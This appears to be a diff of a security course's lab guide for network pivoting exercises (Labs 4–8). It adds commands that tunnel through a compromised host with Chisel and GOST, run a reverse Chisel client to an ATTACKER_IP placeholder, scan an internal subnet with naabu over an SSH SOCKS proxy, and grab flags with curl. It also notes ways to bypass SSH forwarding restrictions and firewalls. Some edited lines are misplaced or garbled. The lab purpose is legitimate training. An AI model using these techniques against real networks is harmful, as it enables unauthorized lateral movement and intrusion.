@@ -162,7 +162,13 @@ SSH’s dynamic port forwarding creates a SOCKS proxy, routing traffic through t
 
 ### Lab 4: Pivoting Gost Task
 #### Objective
-Use Gost to pivot through a compromised host to access an internal network.
+- Use GOST (a secure tunneling tool) on an intermediate host (10.152.152.10) to:
+    - Connect to an internal FTP server (10.152.152.11).
+    - Download flag.txt from an anonymous FTP service.
+- Constraints:
+    - SSH proxy/tunneling is blocked (e.g., -D, -L/-R flags disabled).
+    - No arbitrary shell commands (restricted shell via iptables).
+    - Must use a wrapper to pass arguments through SSH: `ssh -p 2222 root@10.152.152.10 -- ARGS  # ARGS = GOST command`
 
 #### Vulnerabilities
 - Exposed Services: Compromised host with network access allows Gost-based pivoting.
@@ -174,7 +180,7 @@ Compromised host must be accessible and Gost installed.
 1. **Setup**
    - Verify connectivity to the pivot host.
    ```bash
-   ping <PIVOT_IP>
+   ping <TARGET_IP>
    ```
 2. **Reconnaissance**
    - Identify internal network hosts.
@@ -204,7 +210,13 @@ Gost creates a SOCKS5 proxy through the compromised host, enabling access to int
 
 ### Lab 5: Pivoting Chisel Task
 #### Objective
-Use Chisel to pivot through a compromised host to access an internal network.
+- Use Chisel to pivot through a compromised host to access an internal network.
+- Set up a Chisel tunnel through an intermediate SSH host.
+- Listen on TCP port 1337 and ensure it serves an HTTP response with a flag every minute.
+- Restrictions:
+    - The SSH host blocks proxy traffic (e.g., -D, -L/-R forwarding).
+    - No arbitrary shell commands allowed (restricted shell via iptables).
+    - Must use a wrapper to pass arguments via SSH (e.g., ssh -p 2222 root@IP -- ARGS).
 
 #### Vulnerabilities
 - Network Access: Compromised host with open ports allows Chisel-based pivoting.
@@ -214,25 +226,32 @@ Compromised host must have Chisel installed and accessible.
 
 #### Steps
 1. **Setup**
-   - Verify connectivity to the pivot host.
+   - Verify connectivity to host.
    ```bash
-   ping <PIVOT_IP>
+   ping <TARGET_IP>
    ```
 2. **Reconnaissance**
-   - Scan internal network from the pivot host.
+   - Scan the target host to discover on which port is the ssh server running (in port 2222 for our case).
    ```bash
-   nmap -sP <INTERNAL_SUBNET>
+   nmap -sP <TARGET_IP>
    ```
 3. **Exploitation**
-   - Set up a Chisel SOCKS proxy.
+   - Set up a Chisel server on your attacking machine.
    ```bash
-   chisel server -p 8000 --reverse
-   chisel client <PIVOT_IP>:8000 R:socks
-   proxychains nmap -sT <INTERNAL_IP>
+   chisel server -p 5000
    ```
-
+   - Start a netcat listener on the same port `nc -nlvp 1337`
+   - On another terminal, setup the chisel client on the intermediate host via an SSH wrapper
+   ```bash
+   ssh -p 2222 user@<TARGET_IP> -- client <ATTACKER_IP>:5000 0.0.0.0:1337:0.0.0.0:1337
+   ```
+   - Curl the exposed site and get the flag from the netcat listener `curl 127.0.0.1:1337`
+   - The tunnel worked because chisel was made available in `/opt/chisel` in the intermediate (target) host already, and the system is configured to execute the commands in the ssh wrapper with it (chisel) by default. In the absence of the later, we could have tried: `ssh -p 2222 user@<TARGET_IP> -- ./chisel client <ATTACKER_IP>:5000 0.0.0.0:1337:0.0.0.0:1337` (specifying ./chisel from attacking machine.)
+   
 #### Why It Works
-Chisel’s reverse tunneling creates a SOCKS proxy, routing traffic through the compromised host to internal networks.
+- Chisel’s reverse tunneling creates a SOCKS proxy, routing traffic through the compromised host to internal networks.
+- Chisel bypasses SSH restrictions by using its own encrypted tunnel.
+- Reverse mode (R:): The intermediate host connects to your server, avoiding inbound firewall blocks.
 
 #### Alternatives
 - Use SSH dynamic port forwarding for pivoting.
@@ -241,7 +260,7 @@ Chisel’s reverse tunneling creates a SOCKS proxy, routing traffic through the 
 - [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
 #### Notes
-- Ensure Chisel binaries are available on both attacker and pivot hosts.
+- Ensure Chisel binaries are available on both attacking machine.
 
 ---
 
@@ -253,34 +272,36 @@ Pivot through a compromised Linux host using SSH tunneling to access an internal
 - SSH Access: Open SSH service on a compromised host enables tunneling.
 
 #### Requirements
-Compromised Linux host must have SSH access enabled.
+Compromised Linux host must have SSH access enabled. Download and install naabu from apt, snap, or github.
 
 #### Steps
 1. **Setup**
-   - Verify SSH access to the pivot host.
+   - Set up SSH local port forwarding and connect with ssh port forwarding your chosen port. In our case, I chose 9050.
    ```bash
-   ssh user@<LINUX_IP>
+   ssh -D <FORWARDING_PORT> user@<TARGET_IP> -p 2222
    ```
 2. **Reconnaissance**
-   - Identify internal network hosts.
+   - In another terminal, identify internal network hosts which are up and their ports.
    ```bash
-   nmap -sP <INTERNAL_SUBNET>
+   naabu -proxy 127.0.0.1:<FORWARDING_PORT> -port 80,8080,8000 -host 10.152.152.0/24 
    ```
+   - Naabu will find an open port and host (10.152.152.93:8080).
 3. **Exploitation**
-   - Set up SSH local port forwarding.
+   - Access the exposed internal website to get the flag.
    ```bash
-   ssh -L 8080:<INTERNAL_IP>:80 user@<LINUX_IP>
-   curl http://localhost:8080
+   curl --socks5 127.0.0.1:9050 http://10.152.152.93:8080
    ```
 
 #### Why It Works
-SSH local port forwarding redirects traffic through the compromised host, accessing internal services.
+- SSH local port forwarding redirects traffic through the compromised host, accessing internal services. Naabu is nmap on steroids.
+- Chisel bypasses SSH restrictions by using its own encrypted tunnel.
 
 #### Alternatives
 - Use SSH dynamic port forwarding for broader network access.
 
 #### Resources
 - [SSH Tunneling Guide: https://www.ssh.com/academy/ssh/tunneling-example](https://www.ssh.com/academy/ssh/tunneling-example)
+- [Naabu github: https://github.com/projectdiscovery/naabu](https://github.com/projectdiscovery/naabu)
 
 #### Notes
 - Update /etc/ssh/sshd_config to allow TCP forwarding if disabled.
@@ -289,7 +310,7 @@ SSH local port forwarding redirects traffic through the compromised host, access
 
 ### Lab 7: Pivoting Chisel Example
 #### Objective
-Demonstrate pivoting through a compromised host using Chisel to access an internal service.
+Demonstrate pivoting through a compromised host using Chisel to access an internal service. Lab is experimental, no solution required.
 
 #### Vulnerabilities
 - Exposed Ports: Compromised host with network access allows Chisel tunneling.
@@ -299,35 +320,25 @@ Compromised host must have Chisel installed and accessible.
 
 #### Steps
 1. **Setup**
-   - Verify connectivity to the pivot host.
-   ```bash
-   ping <PIVOT_IP>
-   ```
+
 2. **Reconnaissance**
-   - Identify internal service (e.g., web server).
-   ```bash
-   nmap -sT <INTERNAL_IP> -p 80
-   ```
+
 3. **Exploitation**
-   - Set up Chisel reverse tunnel to access the internal service.
-   ```bash
-   chisel server -p 8000 --reverse
-   chisel client <PIVOT_IP>:8000 R:8080:<INTERNAL_IP>:80
-   curl http://localhost:8080
-   ```
+
 
 #### Why It Works
-Chisel’s reverse tunneling forwards internal service ports through the compromised host to the attacker’s machine.
+
 
 #### Alternatives
-- Use SSH local port forwarding for similar access.
+
 
 #### Resources
 - [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
 #### Notes
 - Test connectivity to the internal service after establishing the tunnel.
-
+- Chisel bypasses SSH restrictions by using its own encrypted tunnel.
+- Reverse mode (R:): The intermediate host connects to your server, avoiding inbound firewall blocks.
 ---
 
 ### Lab 8: Network Pivoting
@@ -375,6 +386,9 @@ Compromised host must have access to multiple internal subnets.
    ```bash
    gobuster dir -u http://127.0.0.1:80 -w wordlist.txt
    ```
+#### Why It Works
+- Chisel bypasses SSH restrictions by using its own encrypted tunnel.
+- Reverse mode (R:): The intermediate host connects to your server, avoiding inbound firewall blocks.
 
 #### Alternatives
 - Use SSH port forwarding, or proxychains/SOCKS proxies to expose the internal website. See step by step guide in classes/day 6.
